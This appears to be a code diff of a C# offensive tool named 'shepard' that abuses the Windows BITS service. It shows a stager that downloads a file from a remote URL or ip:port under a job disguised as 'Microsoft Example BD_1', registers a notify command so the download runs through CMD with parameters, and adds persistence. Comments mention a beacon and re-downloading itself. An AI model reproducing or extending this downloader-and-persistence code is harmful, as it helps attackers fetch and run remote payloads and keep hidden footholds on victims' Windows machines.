@@ -4,13 +4,14 @@ using BITS = BITSReference1_5;
 
 
 //add a beacon function somewhere in main ^
+//redownload this executable and run again using bits, different job
 namespace shepard
 {
     class JobObj
     {
         static BITS.BackgroundCopyManager1_5 mgr;
         static BITS.GUID jobGuid;
-        static BITS.IBackgroundCopyJob job;
+        static BITS.IBackgroundCopyJob2 job;
         static JobObj jo;
 
         public JobObj()
@@ -57,9 +58,9 @@ namespace shepard
         private void stager(string remoteLoc, string writeLoc, string optArgs)
         {
             string name = "Microsoft Example BD_1";
-            downloadFile(name, remoteLoc, writeLoc); //initial download, completes
+            jo.downloadFile(name, remoteLoc, writeLoc); //initial download, completes
 
-            persist(name, writeLoc, optArgs);
+            jo.persist(name, remoteLoc, writeLoc, optArgs);
         }
 
         //Usage params: url or ip:port, full path
@@ -97,7 +98,7 @@ namespace shepard
                         job.Complete();
                         break;
 
-                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED:
+                    case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED: //can i use this?
                     case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                         jobIsFinal = true;
                         break;
@@ -113,7 +114,7 @@ namespace shepard
         {
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
             job.AddFile(remote, filePath);
-            job.SetNotifyCmdLine(filePath + cmdArgs, NULL); //runs the file through CMD with params
+            job.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
             job.SetMinimumRetryDelay(60);
             
             job.Resume();
